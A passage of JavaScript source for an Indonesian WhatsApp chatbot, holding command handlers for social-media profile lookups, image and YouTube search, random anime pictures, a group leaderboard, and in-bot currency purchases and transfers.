				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh: ${prefix+command} idgame idserver`)
				if (!args[0]) return m.warning(`ID harus berupa angka!\n\n*Contoh:*\n${prefix+command} idgame idserver`)
				if (!args[1]) return m.warning(`ID Zone harus berupa angka!\n\n*Contoh:*\n${prefix+command} idgame idserver`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let emel = await mlstalk(args[0], args[1])
					m.sendForward(`ID : ${args[0]}
ID Zone : ${args[1]}
Nickname : ${emel.userName}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'githubstalk':
			case 'ghstalk': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} nickname`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let data = await fetchJson(`https://api.github.com/users/${text}`)
					if (data.login) {
						vreden.sendMessage(m.chat, {
							image: {
								url: data.avatar_url
							},
							caption: `*${pj}乂 GITHUB - STALK${pj}*\n\n*ID :* ${data.id}\n*Nickname :* ${data.login}\n*Fullname :* ${data.name}\n*Repository :* ${data.public_repos}\n*Followers :* ${data.followers}\n*Following :* ${data.following}\n*Site Admin :* ${data.site_admin ? "Admin" : 'Pengguna'}\n*Company :* ${data.company}\n*Blog Web :* ${data.blog}\n*Create At :* ${data.created_at}\n*Update At :* ${data.updated_at}\n*Location :* ${data.location}\n*Bio :*\n${data.bio}\n`
						}, {
							quoted: m
						})
					} else {
						m.reply("Username tersebut tidak ditemukan")
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'igstalk': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} nickname`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anuu = await fetchJson(`https://api.vreden.my.id/api/igstalk?query=${text}`)
					const anu = anuu.result
					const nick = anu.result.user.username
					const nama = anu.result.user.full_name
					const post = await convertAngka(anu.result.user.media_count)
					const foll = await convertAngka(anu.result.user.follower_count)
					const foli = await convertAngka(anu.result.user.following_count)
					const bio = anu.result.user.biography
					const jenis = anu.result.user.is_business
					vreden.sendMessage(m.chat, {
						image: {
							url: anu.result.user.hd_profile_pic_url_info.url
						},
						caption: `*${pj}乂 INSTA - STALK${pj}*\n\n*Nickname :* ${nick}\n*Fullname :* ${nama}\n*Postingan :* ${post}\n*Followers :* ${foll}\n*Following :* ${foli}\n*Jenis Akun:* ${jenis ? "Bisnis" : 'Pribadi'}\n*Bio :*\n${bio}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'gimage':
			case 'gi': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await GoogleImage(text)
					let result = await pickRandom(anu)
					vreden.sendMessage(m.chat, {
						image: {
							url: result
						},
						caption: `*Google Image ✨*\n\n*Link :* ${result}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'pinterest2':
			case 'pin2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Anime`)
				if (budy.match(`colmek|coli|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return m.tolak('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let fotopin = await pinterest(text)
					let result = await pickRandom(fotopin)
					vreden.sendMessage(m.chat, {
						image: {
							url: result
						},
						caption: `*Pinterest Search✨*\n\n*Link :* ${result}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'pinterest':
			case 'pin': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan kata pencarian!*\n\n${prefix + command} doraemon\n*Atau:*\n${prefix + command} doraemon|5\n\nUntuk jumlah gambar`)
				if (budy.match(`colmek|coli|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return m.tolak('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
				if (text.includes("|")) {
					var jmlh = text.split("|")[1]
					var cari = text.split("|")[0]
					if (isNaN(jmlh)) return m.warning(`*Jumlah harus berupa angka!*`)
					if (jmlh > 10) return m.warning(`*Jumlah maksimal 10 slide*`)
					if (jmlh < 1) return m.warning(`*Jumlah minimal 1 slide*`)
				}
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let cardpin = []
					let jumlah = jmlh ? jmlh : 5
					let cariin = cari ? cari : text
					let fotopin = await pinterest(cariin)
					for (let i = 0; i < jumlah; i++) {
						const uploadFile = {
							upload: vreden.waUploadToServer
						};
						var pinteres = await prepareWAMessageMedia({
								image: {
									url: fotopin[i]
								},
							},
							uploadFile,
						);
						cardpin.push({
							body: proto.Message.InteractiveMessage.Body.create({
								text: ``
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: footxt
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: `${i + 1}/${jumlah} Image`,
								subtitle: "Yahya Almuthahar",
								imageMessage: pinteres.imageMessage,
								hasMediaAttachment: true
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: [{
									"name": "cta_url",
									"buttonParamsJson": `{\"display_text\":\"📥 Download ( ${i + 1} )\",\"url\":\"${fotopin[i]}\",\"merchant_url\":\"${fotopin[i]}\"}`
								}],
							})
						})
					}
					let msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									body: proto.Message.InteractiveMessage.Body.create({
										text: `*Hasil Pinterest Dari :*\n${cariin}`
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: footxt
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										title: "*Pinterest Search*",
										subtitle: "Yahya Almuthahar",
										hasMediaAttachment: false
									}),
									carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
										cards: cardpin,
									})
								})
							}
						}
					}, {
						quoted: m
					})

					await vreden.relayMessage(msg.key.remoteJid, msg.message, {
						messageId: msg.key.id
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'yts':
			case 'ytsearch': {
				if (!text) return m.warning(`Contoh : ${prefix + command} story wa anime`)
				try {
					let search = await ytdl.search(text)
					let uii = await search.results
					let ytscard = []
					let teks = `*乂 YOUTUBE SEARCH*\n\n${uii[0].title}\n\n*⌬ Video ID:* ${uii[0].videoId}\n*⌬ Views:* ${uii[0].views}\n*⌬ Duration:* ${uii[0].timestamp}\n*⌬ Upload At:* ${uii[0].ago}\n\n`
					let no = 1
					for (let i of uii.filter(objek => objek.type === "video")) {
						ytscard.push({
							title: `${no++}. ${i.title}`,
							rows: [{
									header: `[ ${i.timestamp} ] Download Audio`,
									title: `ID: ${i.videoId}`,
									description: `Link: ${i.url}`,
									id: `.ytmp3 ${i.url}`,
								},
								{
									header: `[ ${i.timestamp} ] Download Video`,
									title: `ID: ${i.videoId}`,
									description: `Link: ${i.url}`,
									id: `.ytmp4 ${i.url}`,
								}
							]
						})
					}
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{\n  title: 'Search 🔎',\n  sections: ${JSON.stringify(ytscard)}\n}`
					}]
					vreden.sendButtonImage(m.chat, {
						url: uii[0].thumbnail
					}, button, teks, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'yts2':
			case 'ytsearch2': {
				if (!text) return m.warning(`Contoh : ${prefix + command} story wa anime`)
				try {
					let search = await ytdl.search(text)
					let uii = await search.results
					let teks = '*YouTube Search*\n\nResult From ' + text + '\nketik *getmusic* untuk mengambil mp3 dan *getvideo* untuk mp4\ngunakan dengan nomor urutan, contoh *getmusic 1*\n\n'
					let no = 1
					for (let i of uii.filter(objek => objek.type === "video")) {
						teks += `⭔ No Urutan : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n─────────────────\n`
					}
					vreden.sendMessage(m.chat, {
						image: {
							url: uii[0].thumbnail
						},
						caption: teks
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			// Random Menu
			case 'cecan': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				var query = ["cewe korea", "cewe china", "cewe Thailand"]
				let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
				let anu = datax[Math.floor(Math.random() * datax.length)]
				vreden.sendMessage(m.chat, {
						caption: "Random Cecan",
						image: {
							url: anu
						}
					}, {
						quoted: m
					})
					.catch((e) => {
						m.reply(mess.error.api)

					})
			}
			break
			case 'akira':
			case 'akiyama':
			case 'ana':
			case 'asuna':
			case 'ayuzawa':
			case 'boruto':
			case 'chitanda':
			case 'chitoge':
			case 'cosplay':
			case 'deidara':
			case 'doraemon':
			case 'elaina':
			case 'emilia':
			case 'erza':
			case 'fanart':
			case 'gremory':
			case 'hestia':
			case 'hinata':
			case 'husbu':
			case 'waifu':
			case 'icon':
			case 'inori':
			case 'isuzu':
			case 'itachi':
			case 'itori':
			case 'kaga':
			case 'kagura':
			case 'kaguya':
			case 'kakasih':
			case 'kaneki':
			case 'kaori':
			case 'keneki':
			case 'kosaki':
			case 'kotori':
			case 'kuriyama':
			case 'kuroha':
			case 'kurumi':
			case 'loli':
			case 'madara':
			case 'mikasa':
			case 'miku':
			case 'minato':
			case 'naruto':
			case 'natsukawa':
			case 'nekonime':
			case 'nezuko':
			case 'nishimiya':
			case 'onepiece':
			case 'pokemon':
			case 'rem':
			case 'rize':
			case 'sagiri':
			case 'sakura':
			case 'sasuke':
			case 'shina':
			case 'shinka':
			case 'shizuka':
			case 'simp':
			case 'tomori':
			case 'toukachan':
			case 'yatogami':
			case 'yuki': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (/akira/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-akira.json"
				if (/akiyama/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-akiyama.json"
				if (/ana/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-anna.json"
				if (/asuna/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-asuna.json"
				if (/ayuzawa/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-ayuzawa.json"
				if (/boruto/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-boruto.json"
				if (/chitanda/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/chitanda.json"
				if (/chitoge/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-chitoge.json"
				if (/cosplay/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-cosplay.json"
				if (/deidara/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-deidara.json"
				if (/doraemon/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/doraemon.json"
				if (/elaina/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-elaina.json"
				if (/emilia/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-emilia.json"
				if (/erza/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-erza.json"
				if (/fanart/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/fanart.json"
				if (/gremory/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/gremory.json"
				if (/hestia/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-hestia.json"
				if (/hinata/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-hinata.json"
				if (/husbu/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/husbu.json"
				if (/waifu/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/waifu.json"
				if (/icon/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/icon.json"
				if (/inori/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-inori.json"
				if (/isuzu/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-isuzu.json"
				if (/itachi/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-itachi.json"
				if (/itori/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-itori.json"
				if (/kaga/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-kaga.json"
				if (/kagura/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-kagura.json"
				if (/kaguya/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/kaguya.json"
				if (/kakasih/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/kakasih.json"
				if (/kaneki/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/kaneki.json"
				if (/kaori/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-kaori.json"
				if (/keneki/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-keneki.json"
				if (/kosaki/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/kosaki.json"
				if (/kotori/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-kotori.json"
				if (/kuriyama/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/kuriyama.json"
				if (/kuroha/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/kuroha.json"
				if (/kurumi/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-kurumi.json"
				if (/loli/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/loli.json"
				if (/madara/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-madara.json"
				if (/mikasa/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-mikasa.json"
				if (/miku/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-miku.json"
				if (/minato/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-minato.json"
				if (/naruto/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-naruto.json"
				if (/natsukawa/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/natsukawa.json"
				if (/nekonime/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/nekonime.json"
				if (/nezuko/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-nezuko.json"
				if (/nishimiya/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/nishimiya.json"
				if (/onepiece/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/onepiece.json"
				if (/pokemon/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/pokemon.json"
				if (/rem/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/rem.json"
				if (/rize/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/rize.json"
				if (/sagiri/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-sagiri.json"
				if (/sakura/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-sakura.json"
				if (/sasuke/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/anime-sasuke.json"
				if (/shina/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/shina.json"
				if (/shinka/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/shinka.json"
				if (/shizuka/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/shizuka.json"
				if (/simp/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/simp.json"
				if (/tomori/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/tomori.json"
				if (/toukachan/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/toukachan.json"
				if (/yatogami/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/yatogami.json"
				if (/yuki/.test(command)) link = "https://www.vreden.my.id/cdn/sfw/yuki.json"
				try {
					let animek = await fetchJson(link)
					let dl_url = await pickRandom(animek)
					vreden.sendMessage(m.chat, {
						caption: `Random ${command}`,
						image: {
							url: dl_url
						}
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cogan': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				var query = ["cowo korea", "cowo china", "cowo Thailand"]
				let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
				let anu = datax[Math.floor(Math.random() * datax.length)]
				vreden.sendMessage(m.chat, {
						caption: "Random Cogan",
						image: {
							url: anu
						}
					}, {
						quoted: m
					})
					.catch((e) => {
						m.reply(mess.error.api)

					})
			}
			break
			// Balance Menu
			case 'topglobal': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {

					function ppnyoo(num) {
						if (num === 1) {
							return "https://telegra.ph/file/f418149c4f8d91d47fd9b.png"
						} else if (num === 2) {
							return "https://telegra.ph/file/66589a9c08e7b092f0d1b.png"
						} else if (num === 3) {
							return "https://telegra.ph/file/6b170e698917c5092f0e0.png"
						} else {
							return "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
						}
					}
					let users = Object.entries(usersdb).map(([key, value]) => {
						return {
							...value,
							jid: key
						}
					})

					function sort(property, ascending = true) {
						if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
						else return (...args) => args[ascending & 1] - args[!ascending & 1]
					}

					function enumGetKey(a) {
						return a.jid
					}

					function toNumber(property, _default = 0) {
						if (property) return (a, i, b) => {
							return {
								...b[i],
								[property]: a[property] === undefined ? _default : a[property]
							}
						}
						else return a => a === undefined ? _default : a
					}
					let sortedRank = users.map(toNumber('rank')).sort(sort('rank'))
					let usersRank = sortedRank.map(enumGetKey)
					let len = args[0] && args[0].length > 0 ? Math.min(10, Math.max(parseInt(args[0]), 10)) : Math.min(10, sortedRank.length)
					let nel = args[0] && args[0].length > 0 ? Math.min(3, Math.max(parseInt(args[0]), 3)) : Math.min(3, sortedRank.length)
					let data = []
					sortedRank.slice(0, nel).map(({
						jid,
						rank
					}, i) => {
						const phon = PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
						const pp = ppnyoo(i + 1)
						const res = {
							top: `${i + 1}`,
							avatar: `${pp}`,
							tag: `${phon}`,
							score: `${usersdb[jid].rank}`
						}
						data.push(res)
					})
					let txt = `
• *GLOBAL RANK TOP ${len}👑* •
Kamu: *${usersRank.indexOf(m.sender) + 1}* dari *${usersRank.length}*

${sortedRank.slice(0, len).map(({ jid, rank }, i) => `${i + 1}. ${participants.some(p => jid === p.jid) ? `(${vreden.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]}\n- *Rank:* ${pangkat(jid).rank}\n- *Rank Points:* ${usersdb[jid].rank}\n- *Level:* ${usersdb[jid].level}`).join`\n\n`}

`
					const topglob = JSON.stringify(data)
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{
  "title": "Claim Points",
  "sections": [
    {
      "title": "Weekly And Monthly",
      "rows": [
        {
          "header": "Claim Weekly Reward 🟣",
          "title": "mingguan",
          "id": ".mingguan"
        },
        {
          "header": "Claim Monthly Reward 🟡",
          "title": "bulanan",
          "id": ".bulanan"
        }
      ]
    },
    {
      "title": "Game Get Reward",
      "rows": [
        {
          "header": "Asah Otak 🧠",
          "title": "asahotak",
          "id": ".asahotak"
        },
        {
          "header": "Tebak Cak Lontong 🎴",
          "title": "caklontong",
          "id": ".caklontong"
        },
        {
          "header": "Family 100 Game 💯",
          "title": "family100",
          "id": ".family100"
        },
        {
          "header": "Lengkapi Kalimat 🕵️‍♂️",
          "title": "lengkapikalimat",
          "id": ".lengkapikalimat"
        },
        {
          "header": "Slot Game 🎰",
          "title": "slot",
          "id": ".slot"
        },
        {
          "header": "Susun Kata 🗯️",
          "title": "susunkata",
          "id": ".susunkata"
        },
        {
          "header": "Tebak Aplikasi 📱",
          "title": "tebakaplikasi",
          "id": ".tebakaplikasi"
        },
        {
          "header": "Tebak Bendera 🇮🇩",
          "title": "tebakbendera",
          "id": ".tebakbendera"
        },
        {
          "header": "Tebak Bom 💣",
          "title": "tebakbom",
          "id": ".tebakbom"
        },
        {
          "header": "Tebak Free Fire 🔫",
          "title": "tebakff",
          "id": ".tebakff"
        },
        {
          "header": "Tebak Gambar 🖼️",
          "title": "tebakgambar",
          "id": ".tebakgambar"
        },
        {
          "header": "Tebak Game 🎮",
          "title": "tebakgame",
          "id": ".tebakgame"
        },
        {
          "header": "Tebak Mobile Legends 🕹️",
          "title": "tebakhero",
          "id": ".tebakhero"
        },
        {
          "header": "Tebak Kalimat ✉️",
          "title": "tebakkalimat",
          "id": ".tebakkalimat"
        },
        {
          "header": "Tebak Kata 📠",
          "title": "tebakkata",
          "id": ".tebakkata"
        },
        {
          "header": "Tebak Kimia ☣️",
          "title": "tebakkimia",
          "id": ".tebakkimia"
        },
        {
          "header": "Tebak Lirik 🎶",
          "title": "tebaklirik",
          "id": ".tebaklirik"
        },
        {
          "header": "Tebak Siapa 👤",
          "title": "tebaksiapa",
          "id": ".tebaksiapa"
        },
        {
          "header": "Tebak Tebakan ❓",
          "title": "tebaktebakan",
          "id": ".tebaktebakan"
        },
        {
          "header": "War ⚔️",
          "title": "war",
          "id": ".war"
        },
        {
          "header": "Attack 🛡️",
          "title": "attack",
          "id": ".attack"
        },
        {
          "header": "Tebak Kabupaten 🏙️",
          "title": "tebakkabupaten",
          "id": ".tebakkabupaten"
        },
        {
          "header": "Tebak JKT48 🎤",
          "title": "tebakjkt48",
          "id": ".tebakjkt48"
        },
        {
          "header": "Tebak Hewan 🐾",
          "title": "tebakhewan",
          "id": ".tebakhewan"
        },
        {
          "header": "Tebak ML 🕹️",
          "title": "tebakml",
          "id": ".tebakml"
        },
        {
          "header": "Tebak Character 👤",
          "title": "tebakchara",
          "id": ".tebakchara"
        },
        {
          "header": "Tebak Logo 🏢",
          "title": "tebaklogo",
          "id": ".tebaklogo"
        },
        {
          "header": "Kuisioner 📝",
          "title": "kuisioner",
          "id": ".kuisioner"
        },
        {
          "header": "Werewolf 🐺",
          "title": "werewolf",
          "id": ".werewolf"
        },
        {
          "header": "Suit PvP ✊✋✌️",
          "title": "suitpvp",
          "id": ".suitpvp"
        },
        {
          "header": "Tic Tac Toe 🎮",
          "title": "tictactoe",
          "id": ".tictactoe"
        },
        {
          "header": "Casino 🎰",
          "title": "casino",
          "id": ".casino"
        }
      ]
    }
  ]
}`
					}]
					vreden.sendButtonImage(m.chat, {
						url: `https://api.vreden.my.id/api/leaderboard?background=https://pomf2.lain.la/f/6mtxnwrm.jpg&data=${encodeURIComponent(topglob)}&scorelabel=${encodeURIComponent("Rank Point:")}`
					}, button, txt, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'buylimit': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = Rp 250 saldo\n\n*Contoh:*\n.buylimit 10`)
				if (text.includes('-')) return m.warning(`Jangan menggunakan -`)
				if (isNaN(text)) return m.warning(`Harus berupa angka`)
				if (args[0] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				let ane = Number(parseInt(text) * 250)
				if (usersdb[m.sender].saldo < ane) return m.warning(`Saldo kamu tidak mencukupi untuk pembelian ini`)
				usersdb[m.sender].saldo -= parseInt(ane)
				usersdb[m.sender].limit += parseInt(text)
				m.reply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Saldo : Rp ${usersdb[m.sender].saldo}\nSisa Limit : ${usersdb[m.sender].limit}`)
			}
			break
			case 'buygamelimit':
			case 'buyglimit': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *jumlah game limit yang ingin dibeli*\n\nHarga 1 game limit = Rp 250 saldo\n*Contoh:*\n.buyglimit 10`)
				if (text.includes('-')) return m.warning(`Jangan menggunakan -`)
				if (isNaN(text)) return m.warning(`Harus berupa angka`)
				if (text === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				let ane = Number(parseInt(text) * 250)
				if (usersdb[m.sender].saldo < ane) return m.warning(`Saldo kamu tidak mencukupi untuk pembelian ini`)
				usersdb[m.sender].saldo -= parseInt(ane)
				usersdb[m.sender].glimit += parseInt(text)
				m.reply(`Pembeliaan game limit sebanyak ${text} berhasil\n\nSisa Saldo : Rp ${usersdb[m.sender].saldo}\nSisa Game Limit : ${usersdb[m.sender].glimit}`)
			}
			break
			case 'ttstalk':
			case 'tiktokstalk': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!q) return m.warning(`Contoh: ${prefix+command} nickname`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let result = await fetchJson(`https://api.vreden.my.id/api/tiktokStalk?query=${text}`)
					let post = await convertAngka(result.result.stats.videoCount)
					let follwer = await convertAngka(result.result.stats.followerCount)
					let follwing = await convertAngka(result.result.stats.followingCount)
					let likes = await convertAngka(result.result.stats.heartCount)
					let fien = await convertAngka(result.result.stats.friendCount)
					vreden.sendMessage(m.chat, {
						image: {
							url: result.result.user.avatarLarger
						},
						caption: `*${pj}乂 TIKTOK - STALK${pj}*\n\n*Nickname :* ${result.result.user.nickname}\n*Username :* ${result.result.user.uniqueId}\n*Postingan :* ${post}\n*Pengikut :* ${follwer}\n*Mengikuti :* ${follwing}\n*Suka :* ${likes}\n*Teman :* ${fien}\n*Bio :* \n${result.result.user.signature}`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'transfer':
			case 'tf': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				var anu = usersdb[m.sender].saldo
				if (anu < args[1] || anu == 'undefined') return m.warning(`Saldo Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}saldo, untuk mengecek Saldo mu!`)
				usersdb[m.sender].saldo -= parseInt(args[1])
				usersdb[users].saldo += parseInt(args[1])
				vreden.sendTextWithMentions(m.chat, `Sukses transfer saldo sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
			}
			break
			case 'transferlimit':
			case 'tflimit': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6287824695047 2000`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				if (!args[1]) return m.warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (isNaN(args[1])) return m.warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6287824695047 2000`)
				if (args[1] === 'infinity') return m.warning(`Yahaha saya ndak bisa di tipu`)
				if (args[1].includes("-")) return m.warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6287824695047 2000`)
				var anu = usersdb[m.sender].limit
				if (anu < args[1] || anu == 'undefined') return m.warning(`Limit Kamu Tidak Mencukupi Untuk Transfer Sebesar Rp ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}limit, untuk mengecek Limit mu!`)
				usersdb[m.sender].limit -= parseInt(args[1])
				usersdb[users].limit += parseInt(args[1])
